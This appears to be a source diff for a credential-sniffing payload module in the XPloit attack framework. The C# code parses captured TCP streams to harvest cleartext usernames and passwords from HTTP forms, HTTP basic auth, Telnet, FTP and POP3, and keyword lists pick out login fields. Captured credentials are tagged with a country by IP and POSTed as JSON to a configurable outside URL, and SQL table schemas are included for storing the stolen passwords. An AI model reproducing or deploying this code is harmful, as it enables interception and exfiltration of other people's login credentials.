@@ -1,8 +1,6 @@
 ﻿using PacketDotNet;
 using System.Dynamic;
-using System.Net.Http;
 using System.Text;
-using System.Text.RegularExpressions;
 using XPloit.Core;
 using XPloit.Helpers;
 using XPloit.Helpers.Attributes;
@@ -16,6 +14,9 @@ using Xploit.Server.Http.Interfaces;
 using Xploit.Server.Http.Enums;
 using System.Collections;
 using System.Linq;
+using System.Net;
+using Xploit.Helpers.Geolocate;
+using System.Collections.Concurrent;
 
 namespace XPloit.Modules.Payloads.Local.Sniffer
 {
@@ -29,9 +30,75 @@ namespace XPloit.Modules.Payloads.Local.Sniffer
         #region Properties
         public bool CaptureOnTcpStream { get { return true; } }
         public bool CaptureOnPacket { get { return false; } }
+        /*
+CREATE TABLE `pass_ftp` (
+  `DATE` datetime NOT NULL,
+  `HOST` varchar(100) NOT NULL DEFAULT '',
+  `PORT` smallint(5) unsigned NOT NULL DEFAULT '0',
+  `USER_HASH` char(40) NOT NULL DEFAULT '',
+  `USER` varchar(100) NOT NULL DEFAULT '',
+  `PASS` varchar(255) NOT NULL DEFAULT '',
+  `VALID` tinyint(3) unsigned NOT NULL DEFAULT '0',
+  `COUNTRY` varchar(10) NOT NULL DEFAULT '',
+  PRIMARY KEY (`HOST`,`PORT`,`USER_HASH`,`VALID`)
+) ENGINE=InnoDB DEFAULT CHARSET=utf8;
 
+CREATE TABLE `pass_pop3` (
+  `DATE` datetime NOT NULL,
+  `HOST` varchar(100) NOT NULL DEFAULT '',
+  `PORT` smallint(5) unsigned NOT NULL DEFAULT '0',
+  `USER_HASH` char(40) NOT NULL DEFAULT '',
+  `USER` varchar(100) NOT NULL DEFAULT '',
+  `PASS` varchar(255) NOT NULL DEFAULT '',
+  `AUTH_TYPE` varchar(20) NOT NULL DEFAULT '',
+  `VALID` tinyint(3) unsigned NOT NULL DEFAULT '0',
+  `COUNTRY` varchar(10) NOT NULL DEFAULT '',
+  PRIMARY KEY (`HOST`,`PORT`,`USER_HASH`,`VALID`,`AUTH_TYPE`)
+) ENGINE=InnoDB DEFAULT CHARSET=utf8;
+
+CREATE TABLE `pass_telnet` (
+  `DATE` datetime NOT NULL,
+  `HOST` varchar(100) NOT NULL DEFAULT '',
+  `PORT` smallint(5) unsigned NOT NULL DEFAULT '0',
+  `USER_HASH` char(40) NOT NULL DEFAULT '',
+  `USER` varchar(100) NOT NULL DEFAULT '',
+  `PASS` varchar(255) NOT NULL DEFAULT '',
+  `VALID` tinyint(3) unsigned NOT NULL DEFAULT '0',
+  `COUNTRY` varchar(10) NOT NULL DEFAULT '',
+  PRIMARY KEY (`HOST`,`PORT`,`USER_HASH`,`VALID`)
+) ENGINE=InnoDB DEFAULT CHARSET=utf8;
+
+CREATE TABLE `pass_httpauth` (
+  `DATE` datetime NOT NULL,
+  `HOST` varchar(100) NOT NULL DEFAULT '',
+  `PORT` smallint(5) unsigned NOT NULL DEFAULT '0',
+  `HTTP_HOST` varchar(100) NOT NULL DEFAULT '',
+  `HTTP_URL` varchar(255) NOT NULL DEFAULT '',
+  `USER_HASH` char(40) NOT NULL DEFAULT '',
+  `USER` varchar(100) NOT NULL DEFAULT '',
+  `PASS` varchar(255) NOT NULL DEFAULT '',
+  `VALID` tinyint(3) unsigned NOT NULL DEFAULT '0',
+  `COUNTRY` varchar(10) NOT NULL DEFAULT '',
+  PRIMARY KEY (`HOST`,`PORT`,`HTTP_HOST`,`HTTP_URL`,`USER_HASH`,`VALID`)
+) ENGINE=InnoDB DEFAULT CHARSET=utf8;
+
+CREATE TABLE `pass_http` (
+  `DATE` datetime NOT NULL,
+  `HOST` varchar(100) NOT NULL DEFAULT '',
+  `PORT` smallint(5) unsigned NOT NULL DEFAULT '0',
+  `HTTP_HOST` varchar(100) NOT NULL DEFAULT '',
+  `HTTP_URL` varchar(255) NOT NULL DEFAULT '',
+  `USER_HASH` char(40) NOT NULL DEFAULT '',
+  `USER` json NOT NULL,
+  `PASS` json NOT NULL,
+  `TYPE` varchar(10) NOT NULL DEFAULT '',
+  `VALID` tinyint(3) unsigned NOT NULL DEFAULT '0',
+  `COUNTRY` varchar(10) NOT NULL DEFAULT '',
+  PRIMARY KEY (`HOST`,`PORT`,`HTTP_HOST`,`HTTP_URL`,`USER_HASH`,`TYPE`,`VALID`)
+) ENGINE=InnoDB DEFAULT CHARSET=utf8;
+        */
         [ConfigurableProperty(Description = "Http post url", Optional = true)]
-        public string APIRestUrl { get; set; }
+        public Uri APIRestUrl { get; set; }
 
         [ConfigurableProperty(Description = "Write credentials as info")]
         public bool WriteAsInfo { get; set; }
@@ -41,108 +108,251 @@ namespace XPloit.Modules.Payloads.Local.Sniffer
         public void OnPacket(IPProtocolType protocolType, IpPacket packet) { }
 
         ICheck[] _Checks = new ICheck[] { ExtractTelnet.Current, ExtractHttp.Current, ExtractFtpPop3.Current };
-        public void OnTcpStream(TcpStream stream, bool isNew)
+        public void OnTcpStream(TcpStream stream, bool isNew, ConcurrentQueue<object> queue)
         {
-            if (stream == null) return;
+            if (stream == null || stream.Count == 0) return;
 
-            if (isNew)
+            if (stream.Variables == null)
             {
                 stream.Variables = new ExpandoObject();
                 stream.Variables.Valid = new bool[] { true, true, true };
             }
 
-            if (stream.Count == 0) return;
-
             // Check
             bool some = false;
-            for (int x = stream.Variables.Valid.Length - 1; x >= 0; x--)
+            try
             {
-                if (!stream.Variables.Valid[x]) continue;
-
-                Credential[] cred;
-                switch (_Checks[x].Check(stream, out cred))
+                for (int x = stream.Variables.Valid.Length - 1; x >= 0; x--)
                 {
-                    case EFound.DontRetry:
-                        {
-                            stream.Variables.Valid[x] = false;
-                            break;
-                        }
-                    case EFound.Retry: some = true; break;
-                    case EFound.True:
-                        {
-                            Publish(cred);
-                            stream.Dispose();
-                            return;
-                        }
+                    if (!stream.Variables.Valid[x]) continue;
+
+                    Credential[] cred;
+                    switch (_Checks[x].Check(stream, out cred))
+                    {
+                        case EFound.DontRetry:
+                            {
+                                stream.Variables.Valid[x] = false;
+                                break;
+                            }
+                        case EFound.Retry: some = true; break;
+                        case EFound.True:
+                            {
+                                stream.Dispose();
+
+                                foreach (Credential c in cred)
+                                {
+                                    // Prevent reiteration
+                                    string json = c.ToString();
+                                    string last;
+                                    if (_LastCred.TryGetValue(c.Type, out last) && last == json)
+                                        continue;
+
+                                    _LastCred[c.Type] = json;
+                                    queue.Enqueue(c);
+                                }
+
+                                return;
+                            }
+                    }
                 }
+            }
+            catch (Exception e)
+            {
+                WriteError(e.ToString());
             }
 
             if (!some)
                 stream.Dispose();
         }
+        Dictionary<string, string> _LastCred = new Dictionary<string, string>();
+        ILocationProvider GeoProvider;
 
-        Dictionary<string, int> nhay = new Dictionary<string, int>();
-        Dictionary<string, int> hay = new Dictionary<string, int>();
-
-        /// <summary>
-        /// Publish method
-        /// </summary>
-        /// <param name="cred">Credentials</param>
-        public void Publish(Credential[] cred)
+        public GetCredentials()
         {
-            if (cred == null) return;
+#if DEBUG
+            GeoProvider = new GeoLite2LocationProvider(@"D:\Fuentes\Xploit\Resources\GeoLite2\Small\GeoLite2-Blocks-IP.csv", @"D:\Fuentes\Xploit\Resources\GeoLite2\Small\GeoLite2-City-Locations-es.csv");
+#endif
+        }
+        public void Dequeue(object o)
+        {
+            Credential c = (Credential)o;
 
+            c.RecallCounty(GeoProvider);
+            string json = c.ToString();
+
+            // Console
             if (WriteAsInfo)
             {
-                foreach (Credential c in cred)
-                {
-                    if (c.IsValid)
-                    {
-                        if (!hay.ContainsKey(c.Type)) hay[c.Type] = 0;
-                        hay[c.Type]++;
-
-                        WriteInfo(c.ToString());
-                    }
-                    else
-                    {
-                        if (!nhay.ContainsKey(c.Type)) nhay[c.Type] = 0;
-                        nhay[c.Type]++;
-
-                        WriteError(c.ToString());
-                    }
-                }
+                if (c.IsValid) WriteInfo(json);
+                else WriteError(json);
             }
-            if (!string.IsNullOrEmpty(APIRestUrl))
+
+            // ApiRest
+            if (APIRestUrl != null)
             {
-                using (HttpClient client = new HttpClient())
+                //using (HttpClient client = new HttpClient() { })
+                //{
+                //    using (HttpResponseMessage response = await client.PostAsync(APIRestUrl, new StringContent(json, Encoding.UTF8, "application/json")))
+                //    {
+                //        using (HttpContent content = response.Content)
+                //        {
+                //            //string data = await content.ReadAsStringAsync();
+                //        }
+                //    }
+                //}
+
+                //t.RunSynchronously();
+                using (WebClient client = new WebClient())
                 {
-                    HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, APIRestUrl);
-                    //request.Content.ww
-                    client.SendAsync(request);
+                    client.Headers[HttpRequestHeader.ContentType] = "application/json";
+
+                    string ret = client.UploadString(APIRestUrl, "POST", json);
+                    int r;
+                    if (!int.TryParse(ret, out r))
+                    {
+
+                    }
                 }
             }
         }
 
+        #region Extractors
         public enum EFound
         {
             True,
             Retry,
             DontRetry
         }
+        public class Credential
+        {
+            IPAddress _Address;
+            /// <summary>
+            /// Date
+            /// </summary>
+            public string Date { get; private set; }
+            /// <summary>
+            /// Address
+            /// </summary>
+            public string Address { get { return _Address.ToString(); } }
+            /// <summary>
+            /// Country
+            /// </summary>
+            public string Country { get; private set; }
+            /// <summary>
+            /// Port
+            /// </summary>
+            public int Port { get; private set; }
 
+            public Credential(DateTime date, IPEndPoint ip)
+            {
+                Date = date.ToString("yyyy-MM-dd HH:mm:ss");
+                _Address = ip.Address;
+                Port = ip.Port;
+            }
+            public bool RecallCounty(ILocationProvider provider)
+            {
+                if (provider != null)
+                {
+                    GeoLocateResult r = provider.LocateIp(_Address);
+                    if (r != null)
+                    {
+                        Country = r.ISOCode;
+                        return true;
+                    }
+                }
+                return false;
+            }
+
+            /// <summary>
+            /// Credential type
+            /// </summary>
+            public virtual string Type { get; }
+            /// <summary>
+            /// Is Valid
+            /// </summary>
+            public bool IsValid { get; set; }
+            /// <summary>
+            /// String representation
+            /// </summary>
+            public override string ToString()
+            {
+                return JsonHelper.Serialize(this, false, false);
+            }
+        }
         public interface ICheck
         {
             EFound Check(TcpStream stream, out Credential[] cred);
         }
+        #endregion
 
         #region Extractors
         public class ExtractHttp : ICheck
         {
+            static string[] UserWordList = new string[] {/* "u",*/ "login", "uid", "id", "userid", "user_id", "user", "uname", "username", "user_name", "usuario", "mail", "email", "name", "user_login", "email_login" };
+            static string[] PasswordWordList = new string[] {/* "p",*/ "pass", "password", "key", "pwd", "clave", "hash", "password_login" };
+
+            public class HttpCookieCredential : Credential
+            {
+                public HttpCookieCredential(DateTime date, IPEndPoint ip) : base(date, ip) { }
+                public override string Type { get { return "HTTP-COOKIE"; } }
+                /// <summary>
+                /// Cookie
+                /// </summary>
+                public string Cookie { get; set; }
+            }
+            public class HttpCredential : Credential
+            {
+                string _Type;
+                public HttpCredential(string type, DateTime date, IPEndPoint ip) : base(date, ip) { _Type = type; }
+                public override string Type { get { return _Type; } }
+                /// <summary>
+                /// Host
+                /// </summary>
+                public string HttpHost { get; set; }
+                /// <summary>
+                /// Url
+                /// </summary>
+                public string HttpUrl { get; set; }
+                /// <summary>
+                /// User
+                /// </summary>
+                public string[] User { get; set; }
+                /// <summary>
+                /// Password
+                /// </summary>
+                public string[] Password { get; set; }
+            }
+            public class HttpAuthCredential : Credential
+            {
+                public HttpAuthCredential(DateTime date, IPEndPoint ip) : base(date, ip) { }
+                public override string Type { get { return "HTTP-AUTH"; } }
+                /// <summary>
+                /// Host
+                /// </summary>
+                public string HttpHost { get; set; }
+                /// <summary>
+                /// Url
+                /// </summary>
+                public string HttpUrl { get; set; }
+                /// <summary>
+                /// User
+                /// </summary>
+                public string User { get; set; }
+                /// <summary>
+                /// Password
+                /// </summary>
+                public string Password { get; set; }
+            }
+
+
+            public enum EDic
+            {
+                User,
+                Pass
+            }
+
             static ICheck _Current = new ExtractHttp();
             public static ICheck Current { get { return _Current; } }
-
-            List<string> _UserFields = new List<string>(new string[] { "user", "username", "userid", "usuario" });
-            List<string> _PasswordFields = new List<string>(new string[] { "pass", "password", "credential", "clave" });
 
             class server : IHttpServer, IEnumerable<HttpRequest>, IDisposable
             {
@@ -174,10 +384,21 @@ namespace XPloit.Modules.Payloads.Local.Sniffer
                 {
                     cred = null;
                     if (stream.FirstStream != null && stream.FirstStream.Emisor != ETcpEmisor.Client) return EFound.DontRetry;
+
+                    if (stream.ClientLength > 30)
+                    {
+                        if (!stream.FirstStream.DataAscii.Contains(" HTTP/"))
+                        {
+                            if (!stream.FirstStream.DataAscii.StartsWith("GET ") &&
+                                !stream.FirstStream.DataAscii.StartsWith("POST "))
+                                return EFound.DontRetry;
+                        }
+                    }
+
                     return EFound.Retry;
                 }
 
-                if (stream.ClientLength < 1)
+                if (stream.ClientLength < 30)
                 {
                     cred = null;
                     return EFound.DontRetry;
@@ -195,7 +416,7 @@ namespace XPloit.Modules.Payloads.Local.Sniffer
 
                         using (server s = new server())
                         using (MemoryStream str = new MemoryStream(pack.Data))
-                        using (HttpProcessor p = new HttpProcessor(stream.DestinationAddress.ToString(), str, s, true))
+                        using (HttpProcessor p = new HttpProcessor(stream.Destination.ToString(), str, s, true))
                         {
                             foreach (HttpRequest r in s)
                             {
@@ -205,53 +426,50 @@ namespace XPloit.Modules.Payloads.Local.Sniffer
 
                                 if (r.Autentication != null)
                                 {
-                                    ls.Add(new HttpAuthCredential()
+                                    ls.Add(new HttpAuthCredential(stream.StartDate, stream.Destination)
                                     {
-                                        Address = stream.Destination.Address.ToString(),
-                                        Port = stream.DestinationPort,
                                         IsValid = valid,
+                                        HttpHost = r.Host.ToString(),
+                                        HttpUrl = r.Url,
                                         Password = r.Autentication.Password,
                                         User = r.Autentication.User
                                     });
                                 }
-                                if (r.GET.Count > 0)
+
+                                if (r.Files.Length > 0)
                                 {
-                                    List<string> users = new List<string>();
+
+                                }
+
+                                for (int x = 0; x < 2; x++)
+                                {
+                                    Dictionary<string, string> d = x == 0 ? r.GET : r.POST;
+
+                                    if (d.Count <= 0) continue;
+
                                     List<string> pwds = new List<string>();
-                                    Fill(r.GET, users, pwds);
-
-                                    if (users.Count > 0 && pwds.Count > 0)
+                                    List<string> users = new List<string>();
+                                    if (Fill(d, pwds, EDic.Pass) && Fill(d, users, EDic.User))
                                     {
-                                        ls.Add(new HttpGetCredential()
+                                        users.Sort();
+                                        pwds.Sort();
+                                        ls.Add(new HttpCredential((x == 0 ? "GET" : "POST"), stream.StartDate, stream.Destination)
                                         {
-                                            Address = stream.Destination.Address.ToString(),
-                                            Port = stream.DestinationPort,
                                             IsValid = valid,
-
+                                            HttpHost = r.Host.ToString(),
+                                            HttpUrl = r.Url,
                                             User = users.Count == 0 ? null : users.ToArray(),
                                             Password = pwds.Count == 0 ? null : pwds.ToArray()
                                         });
                                     }
                                 }
-                                if (r.POST.Count > 0)
-                                {
-                                    List<string> users = new List<string>();
-                                    List<string> pwds = new List<string>();
-                                    Fill(r.POST, users, pwds);
 
-                                    if (users.Count > 0 && pwds.Count > 0)
-                                    {
-                                        ls.Add(new HttpPostCredential()
-                                        {
-                                            Address = stream.Destination.Address.ToString(),
-                                            Port = stream.DestinationPort,
-                                            IsValid = valid,
-
-                                            User = users.Count == 0 ? null : users.ToArray(),
-                                            Password = pwds.Count == 0 ? null : pwds.ToArray()
-                                        });
-                                    }
-                                }
+                                //List<string> sqli = new List<string>();
+                                //if (sqli.Count >= 2)
+                                //    ls.Add(new HttpPostCredential()
+                                //    {
+                                //        User = sqli.Count == 0 ? null : sqli.ToArray(),
+                                //    });
                             }
                         }
                     }
@@ -260,23 +478,65 @@ namespace XPloit.Modules.Payloads.Local.Sniffer
                 return cred == null ? EFound.DontRetry : EFound.True;
             }
 
-            private void Fill(Dictionary<string, string> d, List<string> users, List<string> pwds)
+            bool Exclude(string val, EDic dic)
             {
-                foreach (string su in new string[] { "login", "uid", "user", "usuario", "mail", "name" })
-                    foreach (string k in d.Keys) if (k.Contains(su) && !users.Contains(d[k])) users.Add(d[k]);
+                if (string.IsNullOrEmpty(val)) return true;
+                if (val.StartsWith("http://", StringComparison.InvariantCultureIgnoreCase)) return true;
+                if (val.StartsWith("https://", StringComparison.InvariantCultureIgnoreCase)) return true;
 
-                foreach (string su in new string[] { "pass", "pwd", "clave", "hash" })
-                    foreach (string k in d.Keys) if (k.Contains(su) && !pwds.Contains(d[k])) pwds.Add(d[k]);
+                switch (dic)
+                {
+                    case EDic.User:
+                        {
+                            if (val.Length > 100) return true;
+                            if (val == "0") return true;
+
+                            break;
+                        }
+                    case EDic.Pass:
+                        {
+                            if (val.Length > 130) return true;
+                            break;
+                        }
+                }
+                return false;
+            }
+
+            public bool Fill(Dictionary<string, string> d, List<string> ls, EDic dic)
+            {
+                bool ret = false;
+                string v;
+                foreach (string su in dic == EDic.User ? UserWordList : PasswordWordList)
+                    if (d.TryGetValue(su, out v) && !ls.Contains(v) && !Exclude(v, dic))
+                    {
+                        ls.Add(v);
+                        ret = true;
+                    }
+                return ret;
             }
         }
-
         public class ExtractTelnet : ICheck
         {
+            public class TelnetCredential : Credential
+            {
+                public TelnetCredential(DateTime date, IPEndPoint ip) : base(date, ip) { }
+                public override string Type { get { return "TELNET"; } }
+                /// <summary>
+                /// User
+                /// </summary>
+                public string User { get; set; }
+                /// <summary>
+                /// Password
+                /// </summary>
+                public string Password { get; set; }
+            }
+
+
             static ICheck _Current = new ExtractTelnet();
             public static ICheck Current { get { return _Current; } }
 
-            List<string> _UserFields = new List<string>(new string[] { "user", "username", "userid", "usuario" });
-            List<string> _PasswordFields = new List<string>(new string[] { "pass", "password", "credential", "clave" });
+            List<string> _UserFields = new List<string>(new string[] { "user", "usuario" });
+            List<string> _PasswordFields = new List<string>(new string[] { "pass", "key", "credential", "clave" });
 
             public string CleanTelnet(byte[] data, int index, int length)
             {
@@ -369,11 +629,8 @@ namespace XPloit.Modules.Payloads.Local.Sniffer
                                             password = data;
                                             nextIs = "valid-check";
 
-                                            last = new TelnetCredential()
+                                            last = new TelnetCredential(stream.StartDate, stream.Destination)
                                             {
-                                                Address = stream.Destination.Address.ToString(),
-                                                Port = stream.DestinationPort,
-
                                                 Password = password,
                                                 User = user,
                                                 IsValid = false
@@ -384,7 +641,11 @@ namespace XPloit.Modules.Payloads.Local.Sniffer
                                     case "valid-check":
                                         {
                                             if (last != null)
+                                            {
                                                 last.IsValid = true;
+                                                cred = ret.Count == 0 ? null : ret.ToArray();
+                                                return cred != null ? EFound.True : EFound.DontRetry;
+                                            }
                                             break;
                                         }
                                 }
@@ -401,11 +662,8 @@ namespace XPloit.Modules.Payloads.Local.Sniffer
 
                 if (!string.IsNullOrEmpty(user) && password == null)
                 {
-                    last = new TelnetCredential()
+                    last = new TelnetCredential(stream.StartDate, stream.Destination)
                     {
-                        Address = stream.Destination.Address.ToString(),
-                        Port = stream.DestinationPort,
-
                         Password = password,
                         User = user,
                         IsValid = false
@@ -417,9 +675,39 @@ namespace XPloit.Modules.Payloads.Local.Sniffer
                 return cred != null ? EFound.True : EFound.DontRetry;
             }
         }
-
         public class ExtractFtpPop3 : ICheck
         {
+            public class Pop3Credential : Credential
+            {
+                public Pop3Credential(DateTime date, IPEndPoint ip) : base(date, ip) { }
+                public override string Type { get { return "POP3"; } }
+                /// <summary>
+                /// User
+                /// </summary>
+                public string User { get; set; }
+                /// <summary>
+                /// Password
+                /// </summary>
+                public string Password { get; set; }
+                /// <summary>
+                /// IsAPOP https://tools.ietf.org/html/rfc1939#page-15
+                /// </summary>
+                public string AuthType { get; set; }
+            }
+            public class FTPCredential : Credential
+            {
+                public FTPCredential(DateTime date, IPEndPoint ip) : base(date, ip) { }
+                public override string Type { get { return "FTP"; } }
+                /// <summary>
+                /// User
+                /// </summary>
+                public string User { get; set; }
+                /// <summary>
+                /// Password
+                /// </summary>
+                public string Password { get; set; }
+            }
+
             /*
     # FTP https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes
 
@@ -483,8 +771,7 @@ namespace XPloit.Modules.Payloads.Local.Sniffer
                 bool isValidEnd = false;
                 bool isValid = false, isPasswordFilled = false;
                 bool isPop3 = false, isFtp = false;
-                string user = null, password = null;
-                string challenge = null;
+                string user = null, password = null, challenge = null;
 
                 foreach (TcpStreamMessage pack in stream)
                 {
@@ -667,11 +954,8 @@ namespace XPloit.Modules.Payloads.Local.Sniffer
                 {
                     if (isPop3)
                     {
-                        cred = new Credential[] { new Pop3Credential()
+                        cred = new Credential[] { new Pop3Credential(stream.StartDate,stream.Destination)
                         {
-                            Address = stream.DestinationAddress.ToString(),
-                            Port = stream.DestinationPort,
-
                             AuthType = pop3Type,
                             User = user,
                             Password = password,
@@ -683,11 +967,8 @@ namespace XPloit.Modules.Payloads.Local.Sniffer
                     {
                         if (isFtp)
                         {
-                            cred = new Credential[] {new FTPCredential()
+                            cred = new Credential[] {new FTPCredential(stream.StartDate,stream.Destination)
                             {
-                                Address = stream.DestinationAddress.ToString(),
-                                Port = stream.DestinationPort,
-
                                 User = user,
                                 Password = password,
                                 IsValid = isValid
@@ -701,119 +982,6 @@ namespace XPloit.Modules.Payloads.Local.Sniffer
 
                 return isPop3 || isFtp || stream.Count == 0 ? EFound.Retry : EFound.DontRetry;
             }
-        }
-        #endregion
-
-        #region Credentials
-        public class Credential
-        {
-            /// <summary>
-            /// Address
-            /// </summary>
-            public string Address { get; set; }
-            /// <summary>
-            /// Port
-            /// </summary>
-            public ushort Port { get; set; }
-            /// <summary>
-            /// Credential type
-            /// </summary>
-            public virtual string Type { get; }
-            /// <summary>
-            /// Is Valid
-            /// </summary>
-            public bool IsValid { get; set; }
-            /// <summary>
-            /// String representation
-            /// </summary>
-            public override string ToString()
-            {
-                return JsonHelper.Serialize(this, false, false);
-            }
-        }
-        public class HttpCookieCredential : Credential
-        {
-            public override string Type { get { return "HTTP-COOKIE"; } }
-            /// <summary>
-            /// Cookie
-            /// </summary>
-            public string Cookie { get; set; }
-        }
-        public class HttpPostCredential : Credential
-        {
-            public override string Type { get { return "HTTP-POST"; } }
-            /// <summary>
-            /// User
-            /// </summary>
-            public string[] User { get; set; }
-            /// <summary>
-            /// Password
-            /// </summary>
-            public string[] Password { get; set; }
-        }
-        public class HttpGetCredential : Credential
-        {
-            public override string Type { get { return "HTTP-GET"; } }
-            /// <summary>
-            /// User
-            /// </summary>
-            public string[] User { get; set; }
-            /// <summary>
-            /// Password
-            /// </summary>
-            public string[] Password { get; set; }
-        }
-        public class HttpAuthCredential : Credential
-        {
-            public override string Type { get { return "HTTP-AUTH"; } }
-            /// <summary>
-            /// User
-            /// </summary>
-            public string User { get; set; }
-            /// <summary>
-            /// Password
-            /// </summary>
-            public string Password { get; set; }
-        }
-        public class TelnetCredential : Credential
-        {
-            public override string Type { get { return "TELNET"; } }
-            /// <summary>
-            /// User
-            /// </summary>
-            public string User { get; set; }
-            /// <summary>
-            /// Password
-            /// </summary>
-            public string Password { get; set; }
-        }
-        public class Pop3Credential : Credential
-        {
-            public override string Type { get { return "POP3"; } }
-            /// <summary>
-            /// User
-            /// </summary>
-            public string User { get; set; }
-            /// <summary>
-            /// Password
-            /// </summary>
-            public string Password { get; set; }
-            /// <summary>
-            /// IsAPOP https://tools.ietf.org/html/rfc1939#page-15
-            /// </summary>
-            public string AuthType { get; set; }
-        }
-        public class FTPCredential : Credential
-        {
-            public override string Type { get { return "FTP"; } }
-            /// <summary>
-            /// User
-            /// </summary>
-            public string User { get; set; }
-            /// <summary>
-            /// Password
-            /// </summary>
-            public string Password { get; set; }
         }
         #endregion
     }
